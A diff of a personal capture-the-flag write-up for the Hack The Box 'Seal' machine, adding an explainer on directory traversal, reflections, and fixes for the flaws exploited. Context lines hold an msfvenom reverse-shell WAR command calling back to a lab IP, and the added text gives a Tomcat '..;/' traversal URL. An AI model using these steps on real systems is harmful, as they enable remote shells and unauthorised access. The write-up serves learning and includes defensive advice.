@@ -123,7 +123,16 @@ There are several exploits, but none for this version. We see however an excelle
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war\\
 Then, upload the revshell.war file and access to it (/revshell/)*
 
-The problem is we have nothing to upload such a file. I had to look at the forum for help: apparently, the application is vulnerable to **Directory Traversal**, and we can access the page we want by browsing to *https://seal.htb/manager/jmxproxy/..;/hmtl*:
+The problem is we have nothing to upload such a file. I had to look at the forum for help: apparently, the application is vulnerable to **Directory Traversal**. I've seen this kind of vulnerability in a course, but I don't remember exploiting it. A little refresh could be good, so here's what I found about it on the web:
+
+*Directory traversal (or path traversal) is a type of HTTP exploit that is used by attackers to gain unauthorized access to restricted directories and files. It can be used to access directories and files stored outside of the web root folder, such as application source code or configuration and critical system files. This kind of vulnerability is the result of insufficient filtering/validation of browser input from users. It can be located in web server software/files or in application code that is executed on the server. It exists in varrious languages, including Python, PHP, Apache, Perl and more.*
+
+There are two basic groups of directory traversal vulnerabilies:
+
+- In the web server: typically exploited to execute files. The method for this type of directory traversal attack involves sending URLs to the web server that contain the name of the targeted file and have been modified with commands and web server escape codes. Escape codes are used as workarounds when certain commands are being filtered for; for example, an attacker might use the "%2e%2e/" escape code if the “../” command is blocked. This directory traversal example requires trial-and-error from the attacker, but it is still fairly easy to access and execute files when adequate preventative procedures are not in place.
+- In application code: can be exploited by sending URLs that instruct the web server to return specific filees to the application. For this method to work, the attacker must find a URL in which an application retrieves a file from the web server. Once attackers discover such a URL, they can simply modify the URL string with commands for the server and the name of the file they seek to access. The “../” directive is commonly used, as it instructs the web server to retrieve a file from one directory up. An attacker that is attempting to access a specific file will simply use trial-and-error to determine how many “…/” commands it takes to locate the correct directory and retrieve the file via the application.
+
+In our case, we can access the page we want by browsing to *https://seal.htb/manager/jmxproxy/..;/html*:
 
 <div class="img_container">
 ![manager2]({{https://jsom1.github.io/}}/_images/htb_seal_manag2.png){: height="415px" width = 625px"}
@@ -283,9 +292,12 @@ And we're root!
 
 <ins>**My thoughts**</ins>
 
-I started this box the day before it retired, so I pretty much rushed it and didn't appreciate it like I would have if I had more time. This is especially true for the directory traversal vulnerability that I exploited without thinking too much about it, based on what I found on the forums. Now that the box is done, I'm already starting a new one and won't spend more time trying to understand this one.\\
-Still, it was pretty interesting to see Tomcat and this traversal vulnerability. It's not something that I've seen often so far and I will think about it the next time I look for vunerabilities on a web server.  
+I started this box the day before it retired, so I pretty much rushed it and didn't appreciate it like I would have if I had more time. I really enjoyed the directory traversal vulnerability though, because it's not something I've encountered in practice so far.\\
+Regarding privesc, I first liked the fact I could upload linpeas and run it on the target. I have often been in the situation where the upload works fine, but then the script doesn't run for some reason. Also, 2 privesc were necessary to gain root. On easy machines, we often get a shell as the user who has the flag, and then one privesc is enough to become root. That was unusual in my little experience and I liked it.\\
+Finally, *sudo -l* immediately showed the privesc vector to root, and the process was well adapted to my level.
 
 <ins>**Fix the vulnerabilities**</ins>
 
-First of all, passwords should never be commited on a platform like GitBucket o Github. Because I'm already working on another machine, I won't spend more time on this one...
+Regarding the credentials discovery, it must be said that passwords should never be commited on a platform like GitBucket or Github.\\
+For the directory traversal, user inputs from the browser should be checked and validated. Also, filters can be used to block certain user input (block URLs containing commands and escape codes). It might not resolve the issue here, but it is also important to patch web server software (maybe a more recent version of Tomcat would solve it?).\\
+Finally, symbolic links shlouldn't be allowed in the script, and user permissions should be reviewed.
